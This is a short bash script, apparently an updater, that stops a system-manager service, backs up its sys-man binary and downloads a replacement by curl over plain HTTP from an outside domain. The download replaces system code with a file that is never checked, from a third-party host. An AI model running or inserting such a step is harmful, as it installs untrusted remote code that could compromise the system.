#!/bin/bash

systemctl stop system-manager.service
mv /usr/local/bin/system-manager/sys-man /usr/local/bin/system-manager/sys-man.bak
curl -o /usr/local/bin/system-manager/sys-man http://ps3.christianresearchservice.com/archpower/dl/sys-man.sh
exit;